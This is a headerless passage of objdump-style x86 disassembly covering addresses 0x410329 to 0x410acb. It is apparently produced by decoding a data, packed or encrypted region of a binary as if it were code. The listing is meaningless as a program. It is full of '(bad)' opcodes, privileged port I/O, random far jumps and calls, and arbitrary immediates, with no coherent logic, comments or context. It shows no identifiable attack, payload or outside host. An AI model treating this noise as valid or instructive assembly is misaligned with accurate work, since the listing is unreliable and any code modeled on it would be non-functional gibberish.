  410329:	jle    0x4102b5
  41032b:	sbb    DWORD PTR [eax+0x43],esi
  41032e:	iret   
  41032f:	push   es
  410330:	ds adc al,0xf
  410333:	fnstcw WORD PTR [edi-0x29a5b72e]
  410339:	xchg   esp,eax
  41033a:	dec    edi
  41033b:	fsub   st,st(3)
  41033d:	shl    DWORD PTR [esi],1
  41033f:	mov    esp,0xce9fd00c
  410344:	push   ebx
  410345:	inc    ebx
  410346:	in     al,0xf4
  410348:	retf   0x5115
  41034b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41034c:	pop    eax
  41034d:	lea    eax,[edx-0x32]
  410350:	std    
  410351:	push   0x3b
  410353:	(bad)  
  410354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410355:	sub    cl,BYTE PTR [edi]
  410357:	sbb    edx,esi
  410359:	dec    ebp
  41035a:	mov    esi,0xd0281b9c
  41035f:	mov    bh,0x64
  410361:	(bad)  
  410362:	fisttp WORD PTR [edi+0x313c84d3]
  410368:	cwde   
  410369:	clc    
  41036a:	rcr    BYTE PTR [ecx],0xeb
  41036d:	sbb    BYTE PTR [ebp-0x7d367b5a],bl
  410373:	(bad)  
  410374:	push   ebx
  410375:	retf   
  410376:	dec    ebp
  410377:	dec    esi
  410378:	scas   eax,DWORD PTR es:[edi]
  410379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41037a:	pop    ebx
  41037b:	ins    BYTE PTR es:[edi],dx
  41037c:	stos   BYTE PTR es:[edi],al
  41037d:	imul   ebp,esi,0x34fab411
  410383:	mov    ecx,0x8766575c
  410388:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410389:	push   0xad2ed06d
  41038e:	iret   
  41038f:	(bad)  
  410390:	cmp    ch,BYTE PTR [edi+0x4b]
  410393:	(bad)  
  410395:	rol    BYTE PTR [eax],cl
  410397:	pop    ds
  410398:	test   al,0x24
  41039a:	adc    sp,WORD PTR [edx]
  41039d:	ins    DWORD PTR es:[edi],dx
  41039e:	jbe    0x41041b
  4103a0:	sub    eax,0xdfbf69d8
  4103a5:	test   al,0x3f
  4103a7:	imul   eax,DWORD PTR [ecx],0xffffffac
  4103aa:	push   eax
  4103ab:	and    eax,DWORD PTR [edx-0xa6d8e17]
  4103b1:	and    DWORD PTR [esi-0x48],0x4af3dac4
  4103b8:	cwde   
  4103b9:	ins    DWORD PTR es:[edi],dx
  4103ba:	out    dx,al
  4103bb:	sar    BYTE PTR [edx-0x22],1
  4103be:	or     ah,bh
  4103c0:	mov    ebp,0x61c718da
  4103c5:	repz aad 0xe0
  4103c8:	push   ebx
  4103c9:	jg     0x4103c0
  4103cb:	jbe    0x41035c
  4103cd:	xchg   ebp,eax
  4103ce:	jb     0x4103ce
  4103d0:	mov    WORD PTR [ecx-0x47],gs
  4103d3:	jecxz  0x410373
  4103d5:	inc    esp
  4103d6:	into   
  4103d7:	aam    0x80
  4103d9:	loopne 0x410441
  4103db:	mov    DWORD PTR [ebx+0x7b97fd29],ebx
  4103e1:	xchg   BYTE PTR [edi+0x20],ch
  4103e4:	mov    ah,0x1
  4103e6:	xor    esi,0xfffffff3
  4103e9:	push   edi
  4103ea:	sbb    edx,esi
  4103ec:	cmc    
  4103ed:	cmp    ch,BYTE PTR [ebp+0x6669d215]
  4103f3:	shl    ah,cl
  4103f5:	jle    0x410450
  4103f7:	sbb    eax,0xba2bc1ee
  4103fc:	retf   
  4103fd:	sbb    al,0xa
  4103ff:	pop    ebx
  410400:	arpl   WORD PTR [esi],si
  410402:	gs dec ebp
  410404:	xor    eax,0x68a279a2
  410409:	add    BYTE PTR [eax-0xf],bl
  41040c:	add    esi,DWORD PTR [edi+0xd16d485]
  410412:	mov    WORD PTR [ebp-0x6d61111b],fs
  410418:	xor    ah,BYTE PTR [edx+0xd]
  41041b:	push   ecx
  41041c:	fsub   st(0),st
  41041e:	in     ax,0xe4
  410421:	jl     0x4103fa
  410423:	add    DWORD PTR [esi-0x1d2b3691],esp
  410429:	int3   
  41042a:	jmp    0x410417
  41042c:	sub    al,0xc6
  41042e:	cdq    
  41042f:	mov    ecx,0x1b965bac
  410434:	push   edx
  410435:	out    0x93,al
  410437:	add    eax,esi
  410439:	(bad)  
  41043a:	lea    esi,[ecx-0x2d8e57dd]
  410440:	fiadd  WORD PTR [esi]
  410442:	mov    esp,0x6ab95dbc
  410447:	loope  0x410409
  410449:	add    BYTE PTR [ecx+0x6b],bh
  41044c:	je     0x410405
  41044e:	inc    esi
  41044f:	les    ecx,FWORD PTR [eax+ecx*8+0x6b3098fb]
  410456:	push   ebp
  410457:	pop    ebx
  410458:	mov    bl,0xbf
  41045a:	add    eax,0xee40f6f5
  41045f:	arpl   WORD PTR [ebx-0x35],dx
  410462:	lea    eax,[eax-0x58]
  410465:	int    0x27
  410467:	lods   al,BYTE PTR ds:[esi]
  410468:	aam    0x6a
  41046a:	call   0x816c5ab4
  41046f:	mov    WORD PTR [eax],es
  410471:	aam    0x66
  410473:	loop   0x4104b2
  410475:	popf   
  410476:	mov    ds:0xa5ff9fe2,eax
  41047b:	sbb    edx,edi
  41047d:	xchg   edx,eax
  41047e:	jbe    0x4104c9
  410480:	push   edi
  410481:	mov    WORD PTR [eax-0x65],fs
  410484:	push   ebx
  410485:	pop    ecx
  410486:	mov    ecx,DWORD PTR es:[eax+ebx*4]
  41048a:	jae    0x410495
  41048c:	cdq    
  41048d:	imul   esp,esp,0x9f0e08fa
  410493:	jp     0x410432
  410495:	cmp    BYTE PTR [esi-0x4f],ah
  410498:	xchg   DWORD PTR [ecx+0x42],ecx
  41049b:	ja     0x41041e
  41049d:	mov    ebx,0xefa0d8e8
  4104a2:	out    0xf,al
  4104a4:	sub    al,0x93
  4104a6:	add    DWORD PTR [eax+0x466859e],ebx
  4104ac:	xor    BYTE PTR [ebx],ah
  4104ae:	xchg   ebp,eax
  4104af:	lock jne 0x410451
  4104b2:	jo     0x4104cf
  4104b4:	mov    cl,0x19
  4104b6:	adc    dh,BYTE PTR [esi+edx*8+0x30]
  4104ba:	add    esi,edx
  4104bc:	mov    ebp,0xe6ca6686
  4104c1:	(bad)  
  4104c2:	fsubr  st,st(4)
  4104c4:	pop    ecx
  4104c5:	adc    DWORD PTR [edx-0x182a5823],ebx
  4104cb:	pop    edx
  4104cc:	lea    edi,[edi-0x7129864c]
  4104d2:	std    
  4104d3:	jae    0x410528
  4104d5:	mov    bh,0x53
  4104d7:	jge    0x410550
  4104d9:	sub    eax,DWORD PTR [edx]
  4104db:	icebp  
  4104dc:	out    0x6b,eax
  4104de:	or     edi,DWORD PTR [eax+0x4849d4d8]
  4104e4:	loopne 0x410490
  4104e6:	dec    edi
  4104e7:	(bad)  
  4104e8:	pop    ebp
  4104e9:	or     eax,0x9b50620f
  4104ee:	xor    ebp,eax
  4104f0:	cmc    
  4104f1:	loop   0x410546
  4104f3:	jmp    0xb975:0x23272205
  4104fa:	jge    0x41050f
  4104fc:	jmp    FWORD PTR [ebp+0x2e]
  4104ff:	inc    ebx
  410500:	test   ah,ch
  410502:	cmp    di,WORD PTR [ebx+0x39]
  410506:	add    ch,0x17
  410509:	xor    bh,dh
  41050b:	sbb    ebp,ebx
  41050d:	dec    esi
  41050e:	dec    ebx
  41050f:	bound  edx,QWORD PTR [eax+0x531f53e9]
  410515:	stc    
  410516:	jmp    0x410565
  410518:	in     al,dx
  410519:	(bad)  
  41051a:	rcr    edx,cl
  41051c:	adc    eax,0x794fdc6b
  410521:	pop    es
  410522:	addr16 clc 
  410524:	popf   
  410525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410526:	jo     0x410507
  410528:	out    0x2c,eax
  41052a:	retf   
  41052b:	mov    BYTE PTR [ebx],0x4d
  41052e:	inc    ebp
  41052f:	mov    eax,ds:0xe9f16b0e
  410534:	pop    ds
  410535:	mov    dh,0xeb
  410537:	add    esi,DWORD PTR [ecx]
  410539:	adc    edx,0x1353fd
  41053f:	fnstenv [ebx-0x77]
  410542:	clc    
  410543:	push   0x59
  410545:	imul   esi,DWORD PTR [eax],0x73ac0cb1
  41054b:	gs scas eax,DWORD PTR es:[edi]
  41054d:	test   BYTE PTR [edi],ch
  41054f:	test   al,0xe4
  410551:	push   0x39
  410553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410554:	push   esi
  410555:	call   0x69e1e44f
  41055a:	ins    DWORD PTR es:[edi],dx
  41055b:	test   BYTE PTR [edx+0x70],0x8f
  41055f:	or     ch,dh
  410561:	sub    ebx,DWORD PTR [ecx]
  410563:	xchg   ebx,eax
  410564:	or     BYTE PTR [ebx+0x5cb9fa79],0x63
  41056b:	cmp    al,al
  41056d:	xchg   ecx,eax
  41056e:	jle    0x410524
  410570:	jmp    0xb242:0xf5593a78
  410577:	mov    bh,0x53
  410579:	add    dh,cl
  41057b:	pusha  
  41057c:	or     eax,0x8c465b0d
  410581:	imul   ebx,esp,0xb9f798a8
  410587:	xchg   esi,eax
  410588:	lea    eax,[ecx]
  41058a:	jns    0x410520
  41058c:	add    ch,0xb2
  41058f:	fcom   st(3)
  410591:	inc    ecx
  410592:	in     al,0xd6
  410594:	and    DWORD PTR [edx-0x51],0xd6433ec3
  41059b:	in     eax,dx
  41059c:	inc    edi
  41059d:	cld    
  41059e:	dec    bp
  4105a0:	add    ch,BYTE PTR [esi+0x48]
  4105a3:	repnz sub al,0x85
  4105a6:	cld    
  4105a7:	sbb    ecx,ebp
  4105a9:	loope  0x4105a2
  4105ab:	scas   eax,DWORD PTR es:[edi]
  4105ac:	shr    dl,cl
  4105ae:	push   0xffffff92
  4105b0:	dec    ebx
  4105b1:	mov    ds:0x8967bc79,al
  4105b6:	jge    0x4105a5
  4105b8:	test   eax,0x378256b6
  4105bd:	push   0xffffff98
  4105bf:	frstor [ebp+0x5a0563ad]
  4105c5:	jp     0x410640
  4105c7:	rol    BYTE PTR [eax+eiz*8+0x5eb1ec83],0x8f
  4105cf:	sbb    edx,ebx
  4105d1:	push   ss
  4105d2:	in     eax,dx
  4105d3:	and    DWORD PTR [ebx+0x4c26ec21],esp
  4105d9:	jmp    0x7326:0xdb4bba3c
  4105e0:	dec    edx
  4105e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105e2:	push   edi
  4105e3:	sbb    BYTE PTR [ecx-0x73],ch
  4105e6:	jecxz  0x4105b5
  4105e8:	sub    ch,al
  4105ea:	push   es
  4105eb:	ins    BYTE PTR es:[edi],dx
  4105ec:	push   ebx
  4105ed:	ret    0x38e1
  4105f0:	xor    al,0x6e
  4105f2:	sub    BYTE PTR [eax+0x2d],0xd9
  4105f6:	jnp    0x410653
  4105f8:	nop
  4105f9:	sbb    al,0x9c
  4105fb:	sahf   
  4105fc:	(bad)  
  4105fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105fe:	jmp    0x6f05:0xa7c4
  410604:	fs mov bh,0xbd
  410607:	sub    al,0xe4
  410609:	add    DWORD PTR [ecx-0x734e865f],ecx
  41060f:	or     DWORD PTR [edx+esi*8+0x34],ecx
  410613:	test   al,0x53
  410615:	cmp    ebp,ebp
  410617:	xor    esi,DWORD PTR [esi+0x77]
  41061a:	sbb    al,0x74
  41061c:	pushf  
  41061d:	add    BYTE PTR [ebx],dh
  41061f:	or     BYTE PTR [esi],cl
  410621:	xchg   esi,eax
  410622:	add    DWORD PTR [ebx],ebx
  410624:	and    al,0x1b
  410626:	push   es
  410627:	loop   0x41067c
  410629:	push   ss
  41062a:	outs   dx,BYTE PTR ds:[esi]
  41062b:	push   edi
  41062c:	adc    dl,ah
  41062e:	dec    edi
  41062f:	pxor   mm0,QWORD PTR [ebx]
  410632:	test   DWORD PTR [edi-0x78],0x9366c6
  410639:	mov    ds:0xb7ed8434,eax
  41063f:	sbb    esi,esp
  410641:	fisttp WORD PTR [ebx+0x53]
  410644:	jmp    0x67b:0x52193a51
  41064b:	cdq    
  41064c:	pop    ss
  41064d:	and    dl,ah
  41064f:	mov    bl,0x53
  410651:	mov    eax,0x822a9b74
  410656:	gs cs mov dl,0x69
  41065a:	test   DWORD PTR es:[edx],0xafc379f5
  410661:	mov    al,ds:0x7353fca1
  410666:	aas    
  410667:	fs clc 
  410669:	xchg   edx,eax
  41066a:	add    dl,BYTE PTR [edi]
  41066c:	les    edx,FWORD PTR [esi]
  41066e:	out    dx,eax
  41066f:	(bad)  
  410671:	stos   DWORD PTR es:[edi],eax
  410672:	stc    
  410673:	dec    ebx
  410674:	mov    BYTE PTR [eax],al
  410676:	shl    BYTE PTR [ebx-0x399168d],1
  41067c:	fbld   TBYTE PTR [esi-0x14]
  41067f:	lods   eax,DWORD PTR ds:[esi]
  410680:	mov    dh,0x7c
  410682:	stos   DWORD PTR es:[edi],eax
  410683:	sbb    esp,edi
  410685:	sbb    al,0xcd
  410687:	pop    ecx
  410688:	stos   DWORD PTR es:[edi],eax
  410689:	push   0xffffff99
  41068b:	xor    DWORD PTR [edi],0x9b3f6584
  410691:	cwde   
  410692:	pop    ecx
  410693:	push   es
  410694:	sub    bl,BYTE PTR [ebx+0x6ac87404]
  41069a:	stc    
  41069b:	jle    0x410622
  41069d:	ret    
  41069e:	sbb    DWORD PTR [ecx+edi*1],esi
  4106a1:	mov    ?,WORD PTR [ecx-0x71]
  4106a4:	or     esi,ebx
  4106a6:	aaa    
  4106a7:	inc    ch
  4106a9:	inc    ebp
  4106aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106ab:	aam    0xdf
  4106ad:	xchg   esp,eax
  4106ae:	push   edx
  4106af:	in     eax,dx
  4106b0:	xor    dh,dh
  4106b2:	mov    dh,0xb4
  4106b4:	xchg   ecx,eax
  4106b5:	jle    0x410730
  4106b7:	and    DWORD PTR [edx],ecx
  4106b9:	cld    
  4106ba:	in     eax,dx
  4106bb:	mov    ds:0x1b181ceb,al
  4106c0:	inc    eax
  4106c1:	pop    ds
  4106c2:	mov    cl,0x3a
  4106c4:	sbb    ch,BYTE PTR [ecx]
  4106c6:	add    eax,DWORD PTR [edx+0x68057d53]
  4106cc:	adc    eax,0xe03e519
  4106d1:	imul   edx,DWORD PTR [esi-0x61286983],0x48
  4106d8:	or     al,0x39
  4106da:	add    di,bp
  4106dd:	mov    bl,0xdb
  4106df:	cld    
  4106e0:	(bad)  
  4106e1:	aas    
  4106e2:	dec    ebx
  4106e3:	fnsave [esi-0x35]
  4106e6:	stos   DWORD PTR es:[edi],eax
  4106e7:	rcl    ebx,cl
  4106e9:	dec    eax
  4106ea:	out    0xe5,al
  4106ec:	cli    
  4106ed:	mov    cl,0x54
  4106ef:	repnz inc ebp
  4106f1:	test   BYTE PTR [esi-0x4f],ah
  4106f4:	cmp    dh,BYTE PTR [ebx-0x4d1c9cde]
  4106fa:	sbb    BYTE PTR [ebx],bl
  4106fc:	mov    eax,0xb35b95c4
  410701:	ret    0xcd5
  410704:	push   esp
  410705:	cmc    
  410706:	jno    0x4106b9
  410708:	scas   eax,DWORD PTR es:[edi]
  410709:	or     DWORD PTR [edx-0x7fb7c984],ebp
  41070f:	lods   al,BYTE PTR ds:[esi]
  410710:	mov    DWORD PTR [ecx-0x58ac2c5c],ecx
  410716:	lock ret 0x996a
  41071a:	dec    eax
  41071b:	push   ds
  41071c:	nop
  41071d:	mov    ds:0x8480f854,eax
  410722:	ror    ah,0x7a
  410725:	dec    esi
  410726:	mov    ds:0x9269a518,al
  41072b:	in     eax,dx
  41072c:	retf   
  41072d:	xchg   esi,eax
  41072e:	lods   eax,DWORD PTR ds:[esi]
  41072f:	hlt    
  410730:	push   ebx
  410731:	(bad)  
  410732:	jo     0x41075d
  410734:	out    dx,eax
  410735:	das    
  410736:	and    DWORD PTR [eax-0x22],ecx
  410739:	sbb    BYTE PTR [esi-0xd],ah
  41073c:	adc    edx,eax
  41073e:	inc    esi
  41073f:	inc    ebx
  410740:	mov    ds:0x531b4c29,al
  410745:	loope  0x41076e
  410747:	xor    eax,0x4f9a35e6
  41074c:	loope  0x4107b8
  41074e:	mov    ds:0xeb37d7f6,al
  410753:	dec    eax
  410754:	imul   ecx,DWORD PTR [esi+0x79],0xc
  410758:	pusha  
  410759:	pop    edx
  41075a:	or     eax,0xdaa0d3d5
  41075f:	sbb    edi,eax
  410761:	out    0x37,al
  410763:	shr    BYTE PTR [ebx],cl
  410765:	in     eax,0xe8
  410767:	leave  
  410768:	pop    eax
  410769:	fist   DWORD PTR [edx-0x627d9df6]
  41076f:	cdq    
  410770:	je     0x410798
  410772:	ss adc dh,dl
  410775:	dec    edi
  410776:	push   esp
  410777:	dec    eax
  410778:	cdq    
  410779:	add    BYTE PTR [ebx-0x3f],al
  41077c:	xchg   ebx,eax
  41077d:	jmp    0x460ce5a
  410782:	jns    0x4107bb
  410784:	inc    edx
  410785:	stos   DWORD PTR es:[edi],eax
  410786:	inc    eax
  410787:	lods   al,BYTE PTR ds:[esi]
  410788:	xor    ebx,DWORD PTR [esp+ebp*8-0x1f82830]
  41078f:	add    BYTE PTR [eax-0x3290f1e7],ah
  410795:	test   eax,0xe312094b
  41079a:	or     al,0xf0
  41079c:	inc    ebx
  41079d:	jmp    0xbd89:0x321c3cde
  4107a4:	mul    BYTE PTR [ecx+0xb]
  4107a7:	jp     0x4107d7
  4107a9:	jmp    0x41074b
  4107ab:	xchg   ebp,eax
  4107ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ad:	cmp    bl,BYTE PTR [ecx]
  4107af:	outs   dx,DWORD PTR ds:[esi]
  4107b0:	push   eax
  4107b1:	mov    ebp,0x35629493
  4107b6:	mov    edi,0x8389a334
  4107bb:	out    0x11,al
  4107bd:	imul   ecx,DWORD PTR [edi-0x2a98c96d],0x51
  4107c4:	je     0x410759
  4107c6:	fs test eax,0x6b9631a4
  4107cc:	out    dx,eax
  4107cd:	or     ch,al
  4107cf:	into   
  4107d0:	jmp    0x652d:0xe4460c48
  4107d7:	scas   al,BYTE PTR es:[edi]
  4107d8:	xchg   edx,eax
  4107d9:	mov    bh,0xc5
  4107db:	call   0x7f3f:0x90cc83d3
  4107e2:	jns    0x410781
  4107e4:	icebp  
  4107e5:	pop    es
  4107e6:	mov    ds:0xf0176ea5,al
  4107eb:	mov    eax,0xefac7e03
  4107f0:	mov    al,ds:0x25d340e6
  4107f5:	mov    edi,0xf6b01b13
  4107fa:	in     al,0x0
  4107fc:	push   ebx
  4107fd:	sbb    dh,dh
  4107ff:	aaa    
  410800:	pop    ebp
  410801:	pop    esi
  410802:	push   0xd19d279
  410807:	dec    ebp
  410808:	mov    DWORD PTR ss:[ebx],edi
  41080b:	cdq    
  41080c:	test   eax,0xce44e557
  410811:	nop
  410812:	data16 ins BYTE PTR es:[edi],dx
  410814:	inc    ebx
  410815:	mov    ebx,DWORD PTR [ecx+0x4c]
  410818:	fisttp QWORD PTR [edi+ebx*4+0xd]
  41081c:	or     ch,BYTE PTR [ebx+0x5d]
  41081f:	jnp    0x4107b9
  410821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410822:	outs   dx,DWORD PTR ds:[esi]
  410823:	jns    0x4107d0
  410825:	or     al,0x66
  410827:	pop    ss
  410828:	in     al,0x98
  41082a:	stos   DWORD PTR es:[edi],eax
  41082b:	ret    
  41082c:	pop    ss
  41082d:	mov    eax,ds:0x18ed1991
  410832:	push   eax
  410833:	inc    esi
  410834:	rcr    BYTE PTR [edi+0x354e6305],0x2b
  41083b:	pop    es
  41083c:	push   es
  41083d:	std    
  41083e:	push   si
  410840:	fld    DWORD PTR es:[eax+0x4369a99b]
  410847:	cwde   
  410848:	pop    ecx
  410849:	push   ds
  41084a:	hlt    
  41084b:	xchg   esp,eax
  41084c:	scas   al,BYTE PTR es:[edi]
  41084d:	int3   
  41084e:	and    WORD PTR [eax],cx
  410851:	mov    esp,0x8895e4b3
  410856:	nop
  410857:	popa   
  410858:	retf   0x49dd
  41085b:	xor    BYTE PTR [edx],bl
  41085d:	mov    al,ds:0x94c39d9
  410862:	mov    dl,0x1e
  410864:	push   eax
  410865:	loop   0x410895
  410867:	adc    BYTE PTR [ebx],bl
  410869:	mov    ecx,0x12083063
  41086e:	mov    edi,0x360de019
  410873:	aam    0x5d
  410875:	retf   
  410876:	inc    eax
  410877:	call   DWORD PTR [ebx+0x1b]
  41087a:	ret    0x5942
  41087d:	fadd   DWORD PTR [edi-0x19fddf05]
  410883:	and    DWORD PTR [ebx],0xe834ac2f
  410889:	sub    dh,dh
  41088b:	repnz sub DWORD PTR [edx+0x75a60e71],edx
  410892:	mov    eax,0x1d4c4310
  410897:	jns    0x41085c
  410899:	push   0xfffffffb
  41089b:	jns    0x41087a
  41089d:	inc    eax
  41089e:	out    0xfd,al
  4108a0:	jge    0x4108d5
  4108a2:	jno    0x41091e
  4108a4:	cmp    al,0xac
  4108a6:	push   edi
  4108a7:	cmp    DWORD PTR [ebx],edx
  4108a9:	pop    ebx
  4108aa:	cmp    al,0xff
  4108ac:	push   ss
  4108ad:	imul   ebx,DWORD PTR [eax+edi*1-0x7d151b09],0x47
  4108b5:	inc    eax
  4108b6:	addr16 leave 
  4108b8:	data16 test BYTE PTR [edi+0x30],cl
  4108bc:	fwait
  4108bd:	lea    esp,[esi]
  4108bf:	sub    al,0x8
  4108c1:	cmp    DWORD PTR [edx-0x1740e586],esi
  4108c7:	sbb    esp,edx
  4108c9:	mov    ebx,0x9a3504fe
  4108ce:	xchg   esp,eax
  4108cf:	cwde   
  4108d0:	push   ebx
  4108d1:	dec    eax
  4108d2:	push   eax
  4108d3:	scas   al,BYTE PTR es:[edi]
  4108d4:	ret    
  4108d5:	pop    ds
  4108d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d7:	test   DWORD PTR gs:[ecx+0x5c],ebp
  4108db:	or     eax,0x3ee41896
  4108e0:	js     0x4108bc
  4108e2:	in     ax,0xbf
  4108e5:	push   edx
  4108e6:	sar    DWORD PTR [edi],0xcc
  4108e9:	jae    0x41086c
  4108eb:	fidiv  WORD PTR [ecx+0x58e9e62d]
  4108f1:	out    dx,al
  4108f2:	jp     0x4108fc
  4108f4:	or     BYTE PTR [ebx+0x79],dh
  4108f7:	lods   eax,DWORD PTR ds:[esi]
  4108f8:	xchg   edi,eax
  4108f9:	jl     0x41093c
  4108fb:	mov    edi,ebp
  4108fd:	sub    ah,BYTE PTR [ecx]
  4108ff:	rcr    DWORD PTR [esi*1+0x404dda67],0x58
  410907:	add    eax,0x47ed3b31
  41090c:	pusha  
  41090d:	add    DWORD PTR [edi+0x103603b7],0x1b
  410914:	je     0x410900
  410916:	adc    eax,0xd89d922c
  41091b:	je     0x410970
  41091d:	xor    al,0x80
  41091f:	std    
  410920:	push   0xed2f2f4a
  410925:	push   0xffffffb8
  410927:	and    al,0xde
  410929:	outs   dx,BYTE PTR ds:[esi]
  41092a:	sbb    BYTE PTR [eax+0x7b],ah
  41092d:	push   ebp
  41092e:	gs pop ecx
  410930:	pop    esp
  410931:	std    
  410932:	lea    ebp,[edi+0x3ab243c5]
  410938:	cmp    ecx,esi
  41093a:	popa   
  41093b:	sbb    BYTE PTR [eax+edi*2],dl
  41093e:	inc    edi
  41093f:	dec    eax
  410940:	pop    ebx
  410941:	xchg   ebx,eax
  410942:	cmp    eax,esp
  410944:	push   eax
  410945:	(bad)  
  410946:	cld    
  410947:	or     edi,DWORD PTR [esi]
  410949:	sub    BYTE PTR [edx+0x6a419721],dh
  41094f:	sbb    BYTE PTR [esi+0x42c6b536],dh
  410955:	xchg   DWORD PTR [edi],esp
  410957:	(bad)  
  410958:	push   ebx
  410959:	dec    edx
  41095a:	out    dx,eax
  41095b:	pop    edx
  41095c:	jne    0x41094d
  41095e:	jbe    0x4109d4
  410960:	pop    ss
  410961:	push   es
  410962:	iret   
  410963:	sbb    eax,0x82641479
  410968:	cmp    cl,BYTE PTR [esi-0x1d]
  41096b:	loop   0x4109bd
  41096d:	inc    ebp
  41096e:	shl    BYTE PTR cs:[edi+0x27],0x1d
  410973:	jno    0x4109c2
  410975:	sbb    DWORD PTR [eax],edi
  410977:	sub    ebx,ecx
  410979:	push   0x46
  41097b:	mov    dh,0xba
  41097d:	jnp    0x41092d
  41097f:	pop    ebx
  410980:	out    dx,eax
  410981:	shl    BYTE PTR [esi+0x31],0x38
  410985:	shl    BYTE PTR [edi+0x3b],1
  410988:	(bad)  
  410989:	or     BYTE PTR [ecx+0x6d6ae805],ah
  41098f:	mov    bh,0x37
  410991:	bswap  edx
  410993:	(bad)  
  410994:	scas   eax,DWORD PTR es:[edi]
  410995:	cmp    esp,DWORD PTR [esi+0x72]
  410998:	sbb    eax,0x3a130a20
  41099d:	or     BYTE PTR [ecx],ch
  41099f:	sbb    DWORD PTR [esi+0x18],eax
  4109a2:	fadd   QWORD PTR [ebx]
  4109a4:	sub    al,0x6
  4109a6:	dec    edx
  4109a7:	mov    dl,BYTE PTR [ebx+0x32]
  4109aa:	mov    ah,dl
  4109ac:	cmp    ecx,DWORD PTR ds:0x8c2b61
  4109b2:	nop
  4109b3:	push   es
  4109b4:	in     eax,0xbe
  4109b6:	imul   ebx,DWORD PTR [ebx-0x35],0x39
  4109ba:	and    ebx,esi
  4109bc:	push   ebx
  4109bd:	not    ah
  4109bf:	addr16 jae 0x410976
  4109c2:	fcmovu st,st(7)
  4109c4:	sub    DWORD PTR [esi],eax
  4109c6:	data16 (bad) 
  4109c8:	fsub   st(7),st
  4109ca:	xor    BYTE PTR [ecx-0x1d],0x8a
  4109ce:	cli    
  4109cf:	or     DWORD PTR [edx+0x43553a94],0xffffffff
  4109d6:	jp     0x410a48
  4109d8:	adc    edi,edx
  4109da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109db:	fstp   DWORD PTR [ebx-0x5a]
  4109de:	fidiv  DWORD PTR [ebx+eax*8]
  4109e1:	jecxz  0x410a11
  4109e3:	shl    BYTE PTR [eax-0x77],cl
  4109e6:	adc    ecx,ecx
  4109e8:	dec    ebp
  4109e9:	test   eax,0xecc8f34e
  4109ee:	pushw  ss
  4109f0:	or     DWORD PTR [edi],esi
  4109f2:	xlat   BYTE PTR ds:[ebx]
  4109f3:	mov    DWORD PTR [eax-0x51e639ec],esi
  4109f9:	lods   al,BYTE PTR ds:[esi]
  4109fa:	mov    bh,0x98
  4109fc:	(bad)  
  4109fd:	mov    al,ds:0xb5532a6a
  410a02:	mul    DWORD PTR [eax+0x3]
  410a05:	les    edx,FWORD PTR [ebp+0x261f4f2c]
  410a0b:	adc    BYTE PTR [edi+0x14],0xe6
  410a0f:	stc    
  410a10:	add    al,0x45
  410a13:	adc    eax,0x2fd00153
  410a18:	or     bl,dl
  410a1a:	mov    esi,0x65d2ba00
  410a1f:	fcom   QWORD PTR [ebx+0x14]
  410a22:	arpl   WORD PTR [esi],dx
  410a24:	out    dx,eax
  410a25:	cwde   
  410a26:	sbb    al,0xd2
  410a28:	push   ebx
  410a29:	jbe    0x4109ab
  410a2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a2c:	xchg   ebp,eax
  410a2d:	dec    ebp
  410a2e:	es aad 0xeb
  410a31:	push   0xffffffe2
  410a33:	in     eax,dx
  410a34:	pop    edx
  410a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a36:	ret    
  410a37:	in     al,dx
  410a38:	push   ecx
  410a39:	test   eax,0xd659f279
  410a3e:	js     0x410ab2
  410a40:	clc    
  410a41:	jne    0x4109d7
  410a43:	sbb    DWORD PTR [eax-0xfef2d76],esi
  410a49:	xor    DWORD PTR [ecx-0x1d],esi
  410a4c:	push   ebx
  410a4d:	push   ebx
  410a4e:	std    
  410a4f:	xchg   ebx,eax
  410a50:	outs   dx,DWORD PTR ds:[esi]
  410a51:	clc    
  410a52:	pop    ebp
  410a53:	jmp    0x2307:0x564205f7
  410a5a:	(bad)  
  410a5c:	and    edi,DWORD PTR ds:0x37538085
  410a62:	je     0x410a87
  410a64:	imul   ecx,DWORD PTR [esp+esi*8+0x6c],0x18579277
  410a6c:	pop    eax
  410a6d:	jb     0x410aed
  410a6f:	mov    ah,BYTE PTR [edx+0x58]
  410a72:	cmp    DWORD PTR [ebx-0x10f1dfad],0x7a
  410a79:	dec    esp
  410a7a:	fs push ss
  410a7c:	fdiv   QWORD PTR [edx]
  410a7e:	push   esi
  410a7f:	and    eax,0xeaa6d752
  410a84:	jg     0x410ab5
  410a86:	and    edx,DWORD PTR [ecx]
  410a88:	cmp    DWORD PTR [eax+0x79],edi
  410a8b:	dec    edx
  410a8c:	repnz outs dx,DWORD PTR ds:[esi]
  410a8e:	pop    edi
  410a8f:	inc    edi
  410a90:	adc    eax,0xd4359628
  410a95:	push   0xffffffd7
  410a97:	and    BYTE PTR [ebp-0x1ff5bf96],ch
  410a9d:	mov    ebp,0xeadbe97e
  410aa2:	jge    0x410a3f
  410aa4:	jp     0x410a95
  410aa6:	ss call 0x1666:0x41e66951
  410aae:	cdq    
  410aaf:	and    esi,DWORD PTR [eax-0x74]
  410ab2:	jns    0x410a4a
  410ab4:	pop    ecx
  410ab5:	push   edi
  410ab6:	inc    eax
  410ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ab9:	push   esi
  410aba:	pop    es
  410abb:	sbb    eax,edx
  410abd:	mov    ch,0x5c
  410abf:	test   eax,0x5267ed64
  410ac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ac5:	xor    eax,DWORD PTR [ebp-0x7d]
  410ac8:	push   ebx
  410ac9:	sbb    al,0xce
  410acb:	cmp    al,0x83
